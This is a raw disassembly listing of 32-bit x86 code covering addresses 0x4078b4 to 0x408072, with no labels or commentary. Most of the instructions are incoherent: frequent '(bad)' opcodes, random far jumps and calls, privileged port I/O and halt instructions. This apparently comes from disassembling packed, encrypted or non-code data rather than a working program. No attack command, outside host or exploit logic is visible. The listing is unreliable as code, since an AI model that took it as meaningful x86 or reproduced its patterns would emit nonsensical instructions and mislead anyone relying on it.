  4078b4:	xchg   DWORD PTR [edi],ebp
  4078b6:	repnz pop ss
  4078b8:	cs aaa 
  4078ba:	les    ebx,FWORD PTR [ebx]
  4078bc:	pop    ebp
  4078bd:	mov    al,ds:0x4d9690f9
  4078c2:	out    dx,al
  4078c3:	rcl    DWORD PTR [ecx+0x3],cl
  4078c6:	fldl2t 
  4078c8:	pop    esp
  4078c9:	and    DWORD PTR [edx+edx*4-0x54ec1d52],edi
  4078d0:	mov    dh,0x56
  4078d2:	mov    BYTE PTR [ebx-0x4e6adde2],bl
  4078d8:	es popa 
  4078da:	push   esi
  4078db:	pushf  
  4078dc:	xchg   ecx,eax
  4078dd:	add    DWORD PTR [edx],ebp
  4078df:	ja     0x40791f
  4078e1:	xchg   edx,eax
  4078e2:	xchg   esp,eax
  4078e3:	mov    eax,0x8a37ca39
  4078e8:	mov    ch,0x1d
  4078ea:	mov    al,ds:0xf148a2a3
  4078ef:	fld    QWORD PTR [ebx]
  4078f1:	aam    0xb6
  4078f3:	(bad)  
  4078f4:	lods   al,BYTE PTR ds:[esi]
  4078f5:	fld    QWORD PTR [edx]
  4078f7:	adc    bl,BYTE PTR ds:0xff358f18
  4078fd:	(bad)  [eax-0x57]
  407900:	aas    
  407901:	jb     0x4078a3
  407903:	mov    esp,esp
  407905:	test   DWORD PTR [ecx-0x135f7b5f],0x4ecbb69f
  40790f:	imul   ebx,DWORD PTR [esi],0xf5fcf8ea
  407915:	cmp    BYTE PTR [esi+esi*4-0x21d7d16a],dh
  40791c:	pop    ss
  40791d:	or     al,0xe1
  40791f:	outs   dx,BYTE PTR ds:[esi]
  407920:	pop    ecx
  407921:	mov    eax,0x76f2788e
  407926:	push   DWORD PTR [eax+0x7e]
  407929:	add    BYTE PTR [ebp-0x49ea1c9b],cl
  40792f:	cmp    eax,0x811152fb
  407934:	outs   dx,DWORD PTR ds:[esi]
  407935:	jae    0x40792c
  407937:	stc    
  407938:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407939:	or     ebp,ecx
  40793b:	push   ecx
  40793c:	stos   DWORD PTR es:[edi],eax
  40793d:	int    0xa3
  40793f:	mov    ecx,0x1ed1ef0a
  407944:	adc    ebp,DWORD PTR [eax+0x3a]
  407947:	cmp    al,0xbc
  407949:	ins    DWORD PTR es:[edi],dx
  40794a:	push   ss
  40794b:	push   es
  40794c:	aaa    
  40794d:	jecxz  0x407949
  40794f:	sub    esp,DWORD PTR [edi+0x25261f2e]
  407955:	mov    esp,0xbe692e3b
  40795a:	jmp    DWORD PTR [ecx+0x4994216b]
  407960:	hlt    
  407961:	iret   
  407962:	xchg   ebp,eax
  407963:	jl     0x407914
  407965:	out    dx,eax
  407966:	aam    0xa4
  407968:	out    dx,al
  407969:	mov    edx,0xc5004335
  40796e:	scas   al,BYTE PTR es:[edi]
  40796f:	mov    ecx,0x9ba1083b
  407974:	xchg   edi,eax
  407975:	xor    bl,BYTE PTR [esi+0x6788d2c5]
  40797b:	add    eax,0x245d983c
  407980:	push   edx
  407981:	clc    
  407982:	js     0xa5c4822e
  407988:	xor    BYTE PTR [edi+0x43],al
  40798b:	test   eax,0xd7225c02
  407990:	pop    esp
  407991:	xor    eax,0x6fe41d7
  407996:	xchg   ebx,eax
  407997:	jo     0x407938
  407999:	inc    edx
  40799a:	int    0xba
  40799c:	push   edi
  40799d:	push   ecx
  40799e:	sbb    WORD PTR [edi+0x43],0x4d39
  4079a4:	jle    0x407956
  4079a6:	jp     0x407964
  4079a8:	jbe    0x407952
  4079aa:	outs   dx,DWORD PTR ds:[esi]
  4079ab:	add    dh,BYTE PTR [esp+ecx*1-0x5c977cef]
  4079b2:	out    0xd5,al
  4079b4:	shr    BYTE PTR [edx-0x67],0xe0
  4079b8:	cmc    
  4079b9:	mov    ah,0xc8
  4079bb:	lea    esp,[edx+edx*2-0x5b122013]
  4079c2:	imul   eax,DWORD PTR [ebx+0x1ed73598],0xfd4c1ece
  4079cc:	or     ebx,DWORD PTR [eax+0x36]
  4079cf:	add    DWORD PTR [ebx],ecx
  4079d1:	jno    0x407a1a
  4079d3:	pop    eax
  4079d4:	and    al,0xc4
  4079d6:	push   ss
  4079d7:	sub    bl,BYTE PTR [eax-0x72]
  4079da:	sub    eax,DWORD PTR [edx-0x38]
  4079dd:	lods   al,BYTE PTR ds:[esi]
  4079de:	push   es
  4079df:	and    al,0x3a
  4079e1:	scas   eax,DWORD PTR es:[edi]
  4079e2:	and    ah,dh
  4079e4:	inc    ebp
  4079e5:	sbb    dh,al
  4079e7:	sar    DWORD PTR [edi+ebp*4],cl
  4079ea:	inc    edi
  4079eb:	test   BYTE PTR [edi],dh
  4079ed:	les    ebp,FWORD PTR [eax]
  4079ef:	inc    esp
  4079f0:	lea    esi,[edx]
  4079f2:	fnsetpm(287 only) 
  4079f4:	jmp    0x40797c
  4079f6:	inc    eax
  4079f7:	mov    ebp,0xdce2badf
  4079fc:	(bad)  
  4079fd:	adc    bl,ch
  4079ff:	pop    ebp
  407a00:	sahf   
  407a01:	sub    al,0x7b
  407a03:	add    al,bh
  407a05:	pop    esp
  407a06:	mov    esi,0x59e59403
  407a0b:	out    0xde,eax
  407a0d:	sbb    ecx,DWORD PTR [esi+edi*4+0x52feb997]
  407a14:	add    DWORD PTR [eax+0x9dc222e],ebx
  407a1a:	(bad)  
  407a1b:	jmp    0x407a7f
  407a1d:	pcmpgtw mm1,QWORD PTR [ebx+0x7d]
  407a21:	xchg   ebp,eax
  407a22:	xor    DWORD PTR [ebp+0x4b],ecx
  407a25:	dec    BYTE PTR [edx+0x705cde5]
  407a2b:	fs push ebp
  407a2d:	jmp    0x8d6de3d0
  407a32:	shl    BYTE PTR [ecx+0x1b],1
  407a35:	clc    
  407a36:	es out dx,eax
  407a38:	xor    ebp,DWORD PTR [ecx+ebp*2]
  407a3b:	dec    ebx
  407a3c:	dec    ebx
  407a3d:	mov    ?,edx
  407a3f:	mov    edi,0x95c52ac4
  407a44:	test   DWORD PTR [edx+eax*8],edi
  407a47:	pop    edi
  407a48:	cli    
  407a49:	adc    DWORD PTR [edx],edx
  407a4b:	call   0x36552f87
  407a50:	lods   al,BYTE PTR ds:[esi]
  407a51:	mov    edx,0x72d5cc0b
  407a56:	shl    BYTE PTR [ebx+0x34],0xd6
  407a5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a5b:	dec    esp
  407a5c:	(bad)  
  407a5d:	shr    BYTE PTR [ebx-0x2b],1
  407a60:	sbb    DWORD PTR [ebx],edi
  407a62:	xchg   edx,eax
  407a63:	add    al,0x8a
  407a65:	jmp    0x6ca0977
  407a6a:	repnz shl DWORD PTR [edx+0x23830deb],0xc6
  407a72:	adc    esi,ebx
  407a74:	mov    BYTE PTR [eax-0x7f],ah
  407a77:	mov    es,ebx
  407a79:	mov    ebx,0xf35836b9
  407a7e:	inc    ebx
  407a7f:	xchg   esi,eax
  407a80:	outs   dx,BYTE PTR ds:[esi]
  407a81:	dec    ecx
  407a82:	mov    al,ds:0xd99aae34
  407a87:	or     bh,al
  407a89:	jle    0x407acb
  407a8b:	fstp   DWORD PTR [eax]
  407a8d:	icebp  
  407a8e:	stos   DWORD PTR es:[edi],eax
  407a8f:	inc    ecx
  407a90:	test   DWORD PTR [eax],esp
  407a92:	leave  
  407a93:	aaa    
  407a94:	hlt    
  407a95:	outs   dx,BYTE PTR ds:[esi]
  407a96:	jmp    0xc7fa4bbe
  407a9b:	lds    ebx,FWORD PTR cs:[ebx+0x70]
  407a9f:	aas    
  407aa0:	fadd   QWORD PTR [eax-0x11fe65ae]
  407aa6:	push   cs
  407aa7:	inc    esi
  407aa8:	cdq    
  407aa9:	test   al,0xa6
  407aab:	xchg   ebp,eax
  407aac:	loope  0x407adf
  407aae:	stos   BYTE PTR es:[edi],al
  407aaf:	ret    0xda11
  407ab2:	inc    ecx
  407ab3:	lea    ecx,[ebx+0x38]
  407ab6:	cwde   
  407ab7:	mov    edi,0x50c53576
  407abc:	sar    DWORD PTR [eax],cl
  407abe:	(bad)  
  407abf:	xchg   edi,eax
  407ac0:	inc    eax
  407ac1:	add    DWORD PTR [eax],eax
  407ac3:	add    esp,DWORD PTR [ebx]
  407ac5:	std    
  407ac6:	xchg   ebp,eax
  407ac7:	add    BYTE PTR [edx+0x36ae23d6],dh
  407acd:	ins    BYTE PTR es:[edi],dx
  407ace:	dec    ecx
  407acf:	xchg   ebx,eax
  407ad0:	and    eax,0x4092d736
  407ad5:	inc    ecx
  407ad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ad7:	xor    al,0x7f
  407ad9:	xchg   esi,eax
  407ada:	push   cs
  407adb:	xchg   DWORD PTR [ebp-0x74838306],edi
  407ae1:	pop    ds
  407ae2:	out    dx,eax
  407ae3:	or     DWORD PTR [eax+0x408f9b18],ecx
  407ae9:	dec    ecx
  407aea:	jg     0x407ace
  407aec:	in     al,0x53
  407aee:	push   ecx
  407aef:	and    cl,dh
  407af1:	push   ds
  407af2:	mov    al,0xd2
  407af4:	jle    0x407b6f
  407af6:	or     ah,BYTE PTR [ecx]
  407af8:	outs   dx,BYTE PTR ds:[esi]
  407af9:	sbb    dl,bl
  407afb:	das    
  407afc:	lahf   
  407afd:	inc    eax
  407afe:	je     0x407b1b
  407b00:	sbb    esi,DWORD PTR [eax]
  407b02:	mov    ds,WORD PTR cs:[eax+0x57cdc8ef]
  407b09:	in     eax,dx
  407b0a:	call   0x2e55:0xf18626
  407b11:	jae    0x407a9f
  407b13:	jg     0x407b24
  407b15:	loopne 0x407ad1
  407b17:	mov    dh,0x5b
  407b19:	pop    esi
  407b1a:	retf   
  407b1b:	rol    BYTE PTR [ecx],0x63
  407b1e:	mov    ecx,0x55e9c499
  407b23:	pop    esp
  407b24:	or     eax,0x4306d039
  407b29:	or     eax,0x3068b0f5
  407b2e:	cmp    BYTE PTR [esi+0x679431f3],0xb
  407b35:	push   0xffffffc1
  407b37:	cmp    ebp,ebp
  407b39:	mov    ecx,0xf53ef193
  407b3e:	dec    ebp
  407b3f:	jno    0x407b5b
  407b41:	mov    bh,0x6d
  407b43:	and    DWORD PTR [edi+ecx*8+0x79],edi
  407b47:	fmul   QWORD PTR [eax+0x2fe28c7d]
  407b4d:	gs dec eax
  407b4f:	xchg   ebp,eax
  407b50:	add    al,dl
  407b52:	adc    dl,BYTE PTR [esi-0x4212311b]
  407b58:	or     eax,0xdc552f59
  407b5d:	popa   
  407b5e:	xchg   ebx,eax
  407b5f:	cmp    edi,DWORD PTR [ecx+0x4450cdf7]
  407b65:	mov    esp,0x4b3a7d2c
  407b6a:	cdq    
  407b6b:	popf   
  407b6c:	adc    al,0x6c
  407b6e:	scas   eax,DWORD PTR es:[edi]
  407b6f:	js     0x407b35
  407b71:	cwde   
  407b72:	push   ecx
  407b73:	xchg   ebp,eax
  407b74:	arpl   dx,dx
  407b76:	xor    ebp,DWORD PTR [ebx+ebp*1-0x6b]
  407b7a:	loop   0x407bc9
  407b7c:	mov    edx,0xf4181b17
  407b81:	mov    edi,0xfbc39e39
  407b86:	jo     0x407bd1
  407b88:	and    bl,0x36
  407b8b:	in     eax,0xec
  407b8d:	aad    0x27
  407b8f:	neg    BYTE PTR [edi+edx*8]
  407b92:	add    BYTE PTR [edi-0x10],dh
  407b95:	adc    DWORD PTR ds:0xd51ae055,edi
  407b9b:	enter  0xaa3e,0x30
  407b9f:	ss add eax,0xc899eb6c
  407ba5:	xchg   edx,eax
  407ba6:	xchg   edi,eax
  407ba7:	loope  0x407bcf
  407ba9:	push   esi
  407baa:	jb     0x407c1f
  407bac:	dec    eax
  407bad:	push   0xfffffff3
  407baf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bb0:	cmp    al,0x9c
  407bb2:	add    DWORD PTR [eax],edi
  407bb4:	pusha  
  407bb5:	mov    bl,0x24
  407bb7:	sub    DWORD PTR [ecx+0x3b],ecx
  407bba:	and    cl,dl
  407bbc:	push   ds
  407bbd:	inc    edx
  407bbe:	dec    edi
  407bbf:	ins    BYTE PTR es:[edi],dx
  407bc0:	fimul  DWORD PTR es:[esi]
  407bc3:	(bad)  
  407bc4:	(bad)  [edx]
  407bc6:	sub    ebp,esi
  407bc8:	pop    ebp
  407bc9:	leave  
  407bca:	xor    DWORD PTR [ebp-0x7c16b1ef],edx
  407bd0:	pop    ss
  407bd1:	push   esi
  407bd2:	mov    ebp,0xd6d77952
  407bd7:	addr16 mov al,ds:0xf773
  407bdb:	inc    edi
  407bdc:	mov    eax,ds:0x2e5d05ab
  407be1:	call   0x6770:0x9fbf193a
  407be8:	jmp    0xdf57:0xf8d993e3
  407bef:	push   esp
  407bf0:	dec    ecx
  407bf1:	jnp    0x407be1
  407bf3:	mov    dh,0xe3
  407bf5:	ss aaa 
  407bf7:	adc    DWORD PTR [edi-0x6],esi
  407bfa:	call   0xe81d:0x7a995dbf
  407c01:	sti    
  407c02:	in     eax,0x42
  407c04:	ja     0x407b8e
  407c06:	mov    eax,0x286ad5e0
  407c0b:	pop    ecx
  407c0c:	out    0x47,eax
  407c0e:	xor    eax,0xe7411109
  407c13:	adc    edx,DWORD PTR [edi]
  407c15:	jl     0x407c25
  407c17:	sub    eax,0x34694c55
  407c1c:	or     eax,0xfb64e068
  407c21:	or     al,0x9c
  407c23:	test   esp,ebp
  407c25:	leave  
  407c26:	popf   
  407c27:	data16 fcomp QWORD PTR [edi+edx*2]
  407c2b:	jmp    0x832e:0xee60eb0a
  407c32:	rol    DWORD PTR [ecx],cl
  407c34:	rcr    DWORD PTR [ebx-0x6f],cl
  407c37:	es cld 
  407c39:	pushf  
  407c3a:	js     0x407c6a
  407c3c:	out    0x7d,eax
  407c3e:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c40:	push   0x2a
  407c42:	push   cs
  407c43:	adc    eax,0x9f37aa2d
  407c48:	dec    ebp
  407c49:	sbb    bl,ch
  407c4b:	fistp  QWORD PTR [edi]
  407c4d:	fwait
  407c4e:	repz xlat BYTE PTR ds:[ebx]
  407c50:	mov    dh,0x96
  407c52:	test   ebp,edx
  407c54:	(bad)  
  407c55:	repnz and dl,BYTE PTR [eax]
  407c58:	pop    ecx
  407c59:	int    0x14
  407c5b:	add    eax,0x3e90b3aa
  407c60:	fsubp  st(7),st
  407c62:	pop    edi
  407c63:	mov    al,ds:0xbdb32295
  407c68:	scas   al,BYTE PTR es:[edi]
  407c69:	enter  0xb879,0x7c
  407c6d:	jl     0x407c6b
  407c6f:	jl     0x407cc6
  407c71:	cmp    bh,BYTE PTR [ecx-0x63981b78]
  407c77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c78:	shr    DWORD PTR [ebp-0x11d00025],cl
  407c7e:	and    al,0x7c
  407c80:	cmp    al,0xba
  407c82:	jns    0x407c6f
  407c84:	jl     0x407cf0
  407c86:	cmp    BYTE PTR [ebp+0x5fc267ca],dh
  407c8c:	and    al,0x71
  407c8e:	cmc    
  407c8f:	jno    0x407c15
  407c91:	sub    eax,0x44b06f25
  407c96:	and    DWORD PTR [edx+0x30],esp
  407c99:	pusha  
  407c9a:	cmp    eax,ecx
  407c9c:	mov    DWORD PTR [esi],ebp
  407c9e:	inc    eax
  407c9f:	mov    ds:0x4d0e7018,eax
  407ca4:	pop    edi
  407ca5:	sbb    bh,BYTE PTR [edi+0x3ab65a75]
  407cab:	shr    DWORD PTR [edi-0x48bcd79b],cl
  407cb1:	fwait
  407cb2:	pop    edx
  407cb3:	cmp    edi,DWORD PTR [edx+0x7a08dc3c]
  407cb9:	ja     0x407d1f
  407cbb:	mov    al,ds:0x6f8fb043
  407cc0:	inc    eax
  407cc1:	ins    DWORD PTR es:[edi],dx
  407cc2:	(bad)  
  407cc3:	out    0x6f,eax
  407cc5:	or     al,cl
  407cc7:	or     BYTE PTR [edi+edi*8-0x1722a88a],dh
  407cce:	cmp    bl,BYTE PTR [edx+0x6956f7c1]
  407cd4:	outs   dx,DWORD PTR ds:[esi]
  407cd5:	adc    BYTE PTR [edi+ecx*1+0x61e48036],bl
  407cdc:	add    eax,0x347bf0fc
  407ce1:	sub    al,0xc4
  407ce3:	mov    fs,WORD PTR [esi]
  407ce5:	out    0xe0,eax
  407ce7:	(bad)  
  407ce8:	test   al,0xcc
  407cea:	or     DWORD PTR [edi-0x58],ebp
  407ced:	jo     0x407cd0
  407cef:	shr    DWORD PTR [eax],cl
  407cf1:	dec    ebp
  407cf2:	por    mm6,QWORD PTR [ebp*8-0x7710bdd2]
  407cfa:	sbb    al,0x34
  407cfc:	ds jg  0x407d16
  407cff:	pushf  
  407d00:	(bad)  
  407d01:	ins    DWORD PTR es:[edi],dx
  407d02:	int3   
  407d03:	fdivrp st(3),st
  407d05:	xchg   ebp,eax
  407d06:	fisttp QWORD PTR ss:[esi]
  407d09:	sub    DWORD PTR [edx-0x5d32cfe],edx
  407d0f:	(bad)  
  407d10:	loop   0x407d1d
  407d12:	and    BYTE PTR [edx+0x13],cl
  407d15:	data16 add BYTE PTR [ebp+0x50],bl
  407d19:	pop    es
  407d1a:	fxch   st(5)
  407d1c:	shr    ch,1
  407d1e:	mov    bh,0xcc
  407d20:	cmp    dl,bl
  407d22:	pop    ss
  407d23:	push   ebx
  407d24:	leave  
  407d25:	or     eax,0xe8f46d86
  407d2a:	test   dh,0x76
  407d2d:	es stos DWORD PTR es:[edi],eax
  407d2f:	mov    dl,0x69
  407d31:	jge    0x407d30
  407d33:	mov    bl,0x8
  407d35:	xchg   edi,eax
  407d36:	jge    0x407ced
  407d38:	pop    edi
  407d39:	adc    BYTE PTR [ecx-0x487937bd],cl
  407d3f:	push   ebp
  407d40:	sbb    DWORD PTR [ebp+0x54],ebp
  407d43:	sbb    ah,BYTE PTR [edx]
  407d45:	jecxz  0x407d2b
  407d47:	push   ecx
  407d48:	xor    BYTE PTR [ecx+eax*8+0x70ab20bf],ch
  407d4f:	mov    al,ds:0x815a8299
  407d54:	and    DWORD PTR [edx],edx
  407d56:	pop    ecx
  407d57:	jno    0x407d50
  407d59:	adc    al,0x2e
  407d5b:	js     0x407cdd
  407d5d:	xchg   esp,eax
  407d5e:	iret   
  407d5f:	sar    BYTE PTR [ebp+0x4c],cl
  407d62:	jle    0x407d91
  407d64:	inc    ecx
  407d65:	xchg   ecx,eax
  407d66:	dec    BYTE PTR [ebp-0x75c22fb7]
  407d6c:	call   DWORD PTR [ebx+0x43009c70]
  407d72:	pusha  
  407d73:	push   esi
  407d74:	sbb    ah,BYTE PTR [eax+0x85c3948]
  407d7a:	mov    ah,0x2c
  407d7c:	jl     0x407d80
  407d7e:	pop    ecx
  407d7f:	push   0x8b9cdd74
  407d84:	and    eax,0x818cffa0
  407d89:	pop    ebp
  407d8a:	call   0x395d072e
  407d8f:	fdivr  QWORD PTR [edi+0x57]
  407d92:	cwde   
  407d93:	test   eax,0x768e6e30
  407d98:	add    BYTE PTR [edx],ch
  407d9a:	lds    esi,FWORD PTR [esi+ecx*4-0x44efbbbc]
  407da1:	xchg   DWORD PTR [ebp+0x48318f7d],eax
  407da7:	hlt    
  407da8:	aam    0x8d
  407daa:	mov    ds:0xe78e26d6,al
  407daf:	cmp    ecx,DWORD PTR [edx]
  407db1:	pop    ebp
  407db2:	inc    edi
  407db3:	dec    edx
  407db4:	and    ah,BYTE PTR [edi]
  407db6:	mov    al,ds:0xa1acf1cf
  407dbb:	bound  esp,QWORD PTR [ebx]
  407dbd:	and    ecx,esp
  407dbf:	xor    al,0x3
  407dc1:	adc    eax,0x3e71fc4d
  407dc6:	mov    ds:0x20faad22,al
  407dcb:	mov    eax,0x1a17ba88
  407dd0:	icebp  
  407dd1:	and    bl,BYTE PTR [esi-0x4117079a]
  407dd7:	int    0xd6
  407dd9:	mov    eax,0x7185e017
  407dde:	xor    al,0x14
  407de0:	ret    0xcf1e
  407de3:	bound  ecx,QWORD PTR [edx+0x54fc913f]
  407de9:	jbe    0x407dad
  407deb:	inc    edx
  407dec:	popa   
  407ded:	icebp  
  407dee:	push   edx
  407def:	pop    esi
  407df0:	pop    esi
  407df1:	fisttp QWORD PTR [ebp+0x5f]
  407df4:	jo     0x407d91
  407df6:	mov    ch,0xfa
  407df8:	daa    
  407df9:	aaa    
  407dfa:	daa    
  407dfb:	in     al,0xe1
  407dfd:	jo     0x407d99
  407dff:	retf   0x2af2
  407e02:	jecxz  0x407e80
  407e04:	jge    0x407de8
  407e06:	repz push ecx
  407e08:	xchg   ebp,eax
  407e09:	or     al,0xbe
  407e0b:	xchg   BYTE PTR [esi-0x45],cl
  407e0e:	ret    
  407e0f:	(bad)  
  407e10:	lock out dx,al
  407e12:	lds    ebp,FWORD PTR [edi+edx*1-0x35]
  407e16:	fnstsw WORD PTR [edi+0x2074153e]
  407e1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e1d:	scas   al,BYTE PTR es:[edi]
  407e1e:	pop    edi
  407e1f:	push   ecx
  407e20:	adc    eax,DWORD PTR [ecx-0x3d]
  407e23:	mov    bl,0x5a
  407e25:	push   cs
  407e26:	and    BYTE PTR [eax-0x4d4d5ba9],bl
  407e2c:	add    eax,DWORD PTR [esi]
  407e2e:	imul   ebx,DWORD PTR [ebp-0x6],0xffffffde
  407e32:	mov    WORD PTR [ebp+eax*1-0x6dba55da],?
  407e39:	push   cs
  407e3a:	retfw  
  407e3c:	dec    ecx
  407e3d:	and    eax,0x3b259c0f
  407e42:	retf   0xd3d2
  407e45:	push   es
  407e46:	push   eax
  407e47:	lds    ecx,FWORD PTR [esi]
  407e49:	dec    ebp
  407e4a:	sbb    DWORD PTR [ecx-0x19b22351],0x7e450a6e
  407e54:	push   0x54
  407e56:	rcr    DWORD PTR [ebx-0x16c727eb],0xa0
  407e5d:	push   eax
  407e5e:	dec    ecx
  407e5f:	inc    DWORD PTR [ebx+0x3f]
  407e62:	add    al,0xb
  407e64:	fisub  DWORD PTR [ebx+eax*8-0x58]
  407e68:	mov    al,ds:0xb926ac27
  407e6d:	sahf   
  407e6e:	xor    al,0xc2
  407e70:	mov    eax,ds:0xb61c4428
  407e75:	std    
  407e76:	scas   al,BYTE PTR es:[edi]
  407e77:	xor    edx,eax
  407e79:	int3   
  407e7a:	adc    DWORD PTR [esi],edx
  407e7c:	loopne 0x407e5b
  407e7e:	fcmove st,st(2)
  407e80:	push   es
  407e81:	neg    BYTE PTR [ebp+0xdc7b453]
  407e87:	add    al,BYTE PTR [edx-0x5dc0095b]
  407e8d:	lahf   
  407e8e:	fiadd  WORD PTR [edi]
  407e90:	leave  
  407e91:	mov    dl,0x57
  407e93:	rcl    bl,cl
  407e95:	or     eax,0x5af83a34
  407e9a:	test   al,0xe8
  407e9c:	lods   eax,DWORD PTR ds:[esi]
  407e9d:	inc    ebx
  407e9e:	sti    
  407e9f:	pushf  
  407ea0:	push   0x4a
  407ea2:	fstp   TBYTE PTR [edi+eax*4]
  407ea5:	dec    edx
  407ea6:	rcl    DWORD PTR [ebx],cl
  407ea8:	xchg   esi,eax
  407ea9:	loopne 0x407f0e
  407eab:	sbb    eax,0x28ac3fcd
  407eb0:	or     al,BYTE PTR ds:0x45e5ef60
  407eb6:	add    ah,ch
  407eb8:	hlt    
  407eb9:	cmp    al,0xfd
  407ebb:	or     eax,0x6efa8a39
  407ec0:	jge    0x407e46
  407ec2:	sti    
  407ec3:	mov    es,WORD PTR [ecx+0x46]
  407ec6:	mov    ebp,0xed82008f
  407ecb:	pop    ecx
  407ecc:	mov    ds:0xd609ad6e,al
  407ed1:	ror    esi,cl
  407ed3:	mov    edi,0xe2b9ef6a
  407ed8:	retf   
  407ed9:	push   ebp
  407eda:	aad    0xc5
  407edc:	push   ecx
  407edd:	scas   al,BYTE PTR es:[edi]
  407ede:	je     0x407f00
  407ee0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ee1:	mov    esp,0xa52d4e8a
  407ee6:	fisttp QWORD PTR [ebp+0x47]
  407ee9:	aam    0xc
  407eeb:	pusha  
  407eec:	mov    bh,0xc6
  407eee:	js     0x407f03
  407ef0:	test   edi,0x77e87b76
  407ef6:	adc    al,0x90
  407ef8:	sbb    ch,BYTE PTR [edx]
  407efa:	test   eax,0x324d8554
  407eff:	pop    ebp
  407f00:	dec    esi
  407f01:	or     ebp,edi
  407f03:	push   edx
  407f04:	fstp   DWORD PTR [eax+0x3a32cb6d]
  407f0a:	cmp    DWORD PTR [esi-0x74],0xffffffc4
  407f0e:	sub    DWORD PTR [ecx+0x21f3889e],0x63
  407f15:	pushf  
  407f16:	pop    eax
  407f17:	adc    eax,0x8466b032
  407f1c:	and    bl,BYTE PTR [ebx-0x72]
  407f1f:	adc    al,0xb9
  407f21:	sub    DWORD PTR [esi+0x7d],ebx
  407f24:	mov    al,0x1e
  407f26:	inc    esi
  407f27:	mov    al,0xc2
  407f29:	daa    
  407f2a:	pop    edx
  407f2b:	cmp    al,0x37
  407f2d:	loopne 0x407f89
  407f2f:	inc    esp
  407f30:	push   ds
  407f31:	cmp    ebp,DWORD PTR [ebp+0x57a4684c]
  407f37:	xchg   edx,eax
  407f38:	ins    DWORD PTR es:[edi],dx
  407f39:	adc    al,0x48
  407f3b:	mov    eax,ds:0xc6b1b2c1
  407f40:	adc    edi,ebp
  407f42:	dec    edi
  407f43:	mov    bh,0xbb
  407f45:	cmove  esp,ebx
  407f48:	xchg   ebx,eax
  407f49:	jae    0x407fc0
  407f4b:	dec    eax
  407f4c:	push   edi
  407f4d:	lods   eax,DWORD PTR ds:[esi]
  407f4e:	mov    ecx,0xd2bca2db
  407f53:	fwait
  407f54:	xchg   BYTE PTR [ebp+0x1606af98],al
  407f5a:	dec    eax
  407f5b:	dec    edi
  407f5c:	mov    bh,0x8
  407f5e:	test   al,0xc5
  407f60:	sbb    bl,cl
  407f62:	xor    eax,DWORD PTR [eax+edi*8-0x3dac6ca]
  407f69:	mov    fs,WORD PTR [ecx]
  407f6b:	mov    ds:0xf05e5066,al
  407f70:	in     eax,0x93
  407f72:	in     eax,0x1b
  407f74:	lods   eax,DWORD PTR ds:[esi]
  407f75:	jo     0x407f49
  407f77:	idiv   DWORD PTR [edx+ebp*4-0x21c1ef1b]
  407f7e:	loop   0x407f23
  407f80:	cmp    DWORD PTR [edi+0x39],ebx
  407f83:	pop    edi
  407f84:	mov    ebx,0x8604c89
  407f89:	mov    ds:0x3d485a61,eax
  407f8e:	xchg   ebp,eax
  407f8f:	sbb    esi,edi
  407f91:	popa   
  407f92:	inc    edi
  407f93:	sti    
  407f94:	ds or  cl,dh
  407f97:	dec    eax
  407f98:	outs   dx,BYTE PTR ds:[esi]
  407f99:	(bad)  
  407f9a:	lds    eax,FWORD PTR [edi+0x19112e5d]
  407fa0:	je     0x407f70
  407fa2:	dec    eax
  407fa3:	mov    bl,0x2c
  407fa5:	cld    
  407fa6:	mov    edx,0x897aaeac
  407fab:	ds cmp ah,0xc3
  407faf:	xor    al,0x22
  407fb1:	add    ebp,DWORD PTR [ebx+0x78663d85]
  407fb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fb8:	cdq    
  407fb9:	sbb    ebx,DWORD PTR [ebx-0x6f]
  407fbc:	xchg   ebp,eax
  407fbd:	fwait
  407fbe:	xchg   DWORD PTR [ebx],esp
  407fc0:	mov    BYTE PTR [eax+0x70a6ba5a],bh
  407fc6:	and    ecx,edx
  407fc8:	leave  
  407fc9:	icebp  
  407fca:	mov    DWORD PTR [esi+0x1015cbff],0xed6fe20f
  407fd4:	aam    0xf0
  407fd6:	(bad)  
  407fd7:	(bad)  
  407fd9:	push   0xd5ddaf09
  407fde:	adc    eax,0x2a8f0058
  407fe3:	js     0x407f9f
  407fe5:	popa   
  407fe6:	in     eax,0xb7
  407fe8:	or     ah,BYTE PTR [edi+0x56]
  407feb:	adc    eax,0xb4e1210
  407ff0:	inc    ebx
  407ff1:	cmp    DWORD PTR [ebp+0x14],ebx
  407ff4:	jne    0x408006
  407ff6:	inc    ebp
  407ff7:	call   0x1b48792c
  407ffc:	or     edi,0x6c132bc5
  408002:	lods   eax,DWORD PTR ds:[esi]
  408003:	dec    ebx
  408004:	dec    ebx
  408005:	cmp    eax,0xcbaf99ca
  40800a:	pop    eax
  40800b:	stc    
  40800c:	xor    dl,BYTE PTR [esi+0x3c]
  40800f:	fild   QWORD PTR [ecx]
  408011:	pop    ebx
  408012:	mov    ebx,0xfafd3a7c
  408017:	inc    eax
  408018:	stc    
  408019:	push   edi
  40801a:	(bad)  
  40801c:	icebp  
  40801d:	ja     0x407fa4
  40801f:	and    DWORD PTR [ecx+eax*8-0x502a1c26],ebp
  408026:	and    BYTE PTR [ebp+0x765529a2],dh
  40802c:	adc    DWORD PTR [ecx],esp
  40802e:	push   edi
  40802f:	sub    ch,bh
  408031:	sbb    eax,0x8a16fb71
  408036:	ret    0xb3cf
  408039:	xchg   ebx,eax
  40803a:	mov    ebx,0x7354916f
  40803f:	aad    0x72
  408041:	in     eax,dx
  408042:	out    dx,eax
  408043:	js     0x40809f
  408045:	rcl    DWORD PTR [ecx-0x2c],0x66
  408049:	sub    ebx,edx
  40804b:	retf   
  40804c:	sub    al,0x0
  40804e:	dec    eax
  40804f:	jae    0x4080b7
  408051:	jo     0x4080a8
  408053:	mov    al,ds:0x7ce5e9a4
  408058:	ficom  DWORD PTR [esi+0x4b]
  40805b:	push   ebp
  40805c:	adc    eax,0x2780ecac
  408061:	pop    eax
  408062:	jnp    0x4080b2
  408064:	stos   DWORD PTR es:[edi],eax
  408065:	cmp    dh,BYTE PTR [ebx+0x4ab1474]
  40806b:	jne    0x4080c3
  40806d:	fsub   st(0),st
  40806f:	or     al,BYTE PTR [edi-0x7f]
  408072:	ds ret 
